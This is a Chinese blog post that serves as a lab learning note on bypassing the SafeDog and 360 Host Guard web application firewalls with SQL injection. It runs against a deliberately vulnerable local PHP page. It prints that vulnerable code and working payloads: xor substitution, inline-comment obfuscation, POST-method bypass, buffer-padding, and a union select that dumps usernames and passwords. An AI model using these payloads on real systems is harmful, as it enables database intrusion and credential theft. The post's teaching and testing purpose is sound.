---
title: 【经验总结】SQL注入Bypass安全狗360主机卫士
date: 2020-01-05 21:16:42
id: 200105-211642
img: https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/SQL_Bypass2.png
tags:
- SQL 注入
- Bypass
- 经验总结
categories:
- 经验总结
---
# 0x00 前言
这类的文章已经是比较多了，本文也主要是作为学习笔记来记录，主要是记录一下我在学习 SQL 注入 Bypass 的过程，同时前人的不少绕过方法已经失效了，所以这里也是记录一下最新规则的一些绕过方法。

# 0x01 环境搭建
测试环境：Win7 + Apache + MySQL 5.7.26 + PHP 5.5.45
<!--more-->
测试代码：

``` php
<?php
if ($_GET['id']==null){$id=$_POST['id'];}
else {$id=$_GET['id'];}
$con = mysql_connect("localhost","root","root");
if (!$con){die('Could not connect: ' . mysql_error());}
mysql_select_db("dvwa", $con);
$query = "SELECT first_name,last_name FROM users WHERE user_id = '$id'; ";
$result = mysql_query($query)or die('<pre>'.mysql_error().'</pre>');
while($row = mysql_fetch_array($result))
{
 echo $row['0'] . "&nbsp" . $row['1'];
 echo "<br />";
}
echo "<br/>";
echo $query;
mysql_close($con);
?>
```
上面的测试代码是参考安全客上的一篇文章，不过为了方便测试在原代码的基础上加入了 POST 传参功能，代码来自本文参考文章第 2 篇。

为方便接下来的测试，需要本地先安装 dvwa ，至于代码中其他的参数，比如数据库地址、用户名、密码什么的自行根据自己本地配置情况修改即可。

如果这个代码在使用的过程中，只使用 POST 方法传参的话，页面是会输出错误信息的，如果不想让它输出错误信息，可以在 php.ini 文件中修改 display_errors 为 Off ，然后重启 Apache 即可。

访问本地搭建的靶场地址，像下面这个样子就算是搭建成功了，其中 192.168.38.132​ 需要修改为你自己的靶机 IP 地址。

```
http://192.168.38.132/sql.php?id=1
```
![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/SQL_Bypass1.png)

# 0x02 安全狗
## 1、搭建
下载地址：[http://free.safedog.cn/website_safedog.html](http://free.safedog.cn/website_safedog.html)

我下载的是 Windows Apache V4.0 的版本，2019-11-27 更新的规则。

在安装安全狗的时候，如果不知道服务名填什么，可以查看本文参考文章第 5 篇。

如果使用 phpstudy 8.0 及更高版本可能在系统服务中找不到 apache 的服务名，所以这时建议使用 8.0 以下版本，比如 phpstudy 2018，之后再设置运行模式为“系统服务”即可，不要问我怎么知道的 [狗头]

搭建好后，我们构造 SQL 注入语句判断注入点，访问目标网站，网站有安全狗的提示，说明就搭建好了。

```
http://192.168.38.132/sql.php?id=1' and '1'='1
```
![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/SQL_Bypass2.png)

## 2、找寻绕过方法
```
' and '1'='1
```
多次测试发现单引号不会被拦截，and 也不会被拦截，只有当 and 后加上字符，比如 and '1' 的时候才会被拦截，所以接下来就主要针对 and 进行绕过测试。

一般情况下，如果 and 被拦截，可以下列字符进行绕过。

```
+，-，*，%，/，<<，>>，||，|，&，&&
```
或者使用 or 进行绕过，也可以直接使用异或进行绕过。

```
^，xor
```
因为我下载的版本的规则是最新的，所以参考文章中利用 && 替换 and 的方法已经失效了，经过多次测试，这里使用异或是可以绕过安全狗进而判断注入点的。

```
' xor '1
```
![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/SQL_Bypass3.png)

接下来使用 union select 查看一下数据库名和用户名。

```
'union select database(),user()'
```
直接这样肯定会被拦截的，所以接下来找寻绕过方法。

### a、利用()代替空格
```
'union select(database()),(user())'
```
数据或者函数周围可以无限嵌套()。

### b、利用 mysql 特性 /*!*/ 执行语句
```
'union /*!50010select*/(database()),(user())'
```
/*!*/ 中间的代码是可以执行的，其中 50010 为 mysql 版本号，只要 mysql 大于这个版本就会执行里面的代码。

### c、利用/**/混淆代码
```
'union/**//*!50010select*/(database/**/()),(user/**/())'
```
mysql 关键字中是不能插入 /\*\*/ 的，即 se/\*\*/lect 是会报错的，但是函数名和括号之间是可以加上 /\*\*/ 的,像 database/\*\*/() 这样的代码是可以执行的。

事实上，由于我的防护规则是 2019-11-27 更新的，所以即使如此，依旧不能绕过，不过由于安全狗对于 GET 的过滤相较于 POST 更为严格，所以后来经过测试发现使用 POST 方法是可以进行绕过的。

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/SQL_Bypass4.png)

可以看到使用 POST 方法是可以成功绕过，除了上面的3个方法，有时候使用 %00 也会有意想不到的效果。

知道了绕过方法，便可以一路找到用户名和密码。

```
'union select user,password from users#
```
经过测试，发现在 POST 方法下，加个括号即可绕过安全狗，这也足以看出安全狗对于 POST 方法的过滤是多么不严格。

```
'union select user,password from (users)#
```
![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/SQL_Bypass5.png)

绕过的方法还有很多，安全狗的就记录到这里，接下来看看 360 主机卫士。

# 0x03 360 主机卫士
## 1、搭建
曾经 360 出现过一款 360 主机卫士，不过现在已经停止更新和维护了，官网也打不开了，所以只能在第三方网站下载了，这里我下载的是 2.0.5.9 版本。

下载地址：[http://www.pc6.com/softview/SoftView_145230.html](http://www.pc6.com/softview/SoftView_145230.html)

虽然 360 主机卫士已经停止了更新，但是拿来练练手还是可以滴。

下载之后，访问 ' and '1'='1 如果发现被拦截了，返回内容像下面这个样子，说明就搭建成功了。

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/SQL_Bypass6.png)

## 2、找寻绕过方法
```
' and '1'='1
```
经过多次测试，这里使用 && 即可绕过，使用异或也是可以绕过的。

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/SQL_Bypass7.png)

接下来看看 union select 怎么进行绕过。

```
'union select database(),user()'
```
经过多次测试，发现可以通过缓冲区溢出进行绕过，但也只有在 POST 方法下才有效。

```
' and (select 1)=(select 0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)union select database(),user()'
```
![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/SQL_Bypass8.png)

# 0x04 工具
提到 SQL 注入的工具，个人觉着就不得不提 shack2 的超级 SQL 注入工具，针对于上面缓冲区绕过的情况，使用这个工具可以很方便的进行 SQL 注入。

工具下载地址：[https://github.com/shack2/SuperSQLInjectionV1/releases](https://github.com/shack2/SuperSQLInjectionV1/releases)

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/SQL_Bypass9.png)

把 Burp 中的数据包复制到工具中，在注入标记、编码标记后，就可以获取数据了，对于如何标记注入点不理解的可以看看这个工具的教学视频以及文档，会容易理解些。

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/SQL_Bypass10.png)

至于其他更为复杂的绕过，比如上面安全狗的绕过，利用这个工具的注入绕过模块也是可以的，当然使用 sqlmap 的 tamper 脚本也是 OK 的，暂时本文就先记录到这里。

>更多信息欢迎关注我的微信公众号：TeamsSix

>参考文章：
>[https://zhuanlan.zhihu.com/p/41332480](https://zhuanlan.zhihu.com/p/41332480)
>[https://www.anquanke.com/post/id/102852](https://www.anquanke.com/post/id/102852)
>[https://www.secpulse.com/archives/68991.html](https://www.secpulse.com/archives/68991.html)
>[https://www.cnblogs.com/xiaozi/p/9132737.html](https://www.cnblogs.com/xiaozi/p/9132737.html)
>[https://blog.csdn.net/weixin_30886233/article/details/95871508](https://blog.csdn.net/weixin_30886233/article/details/95871508)
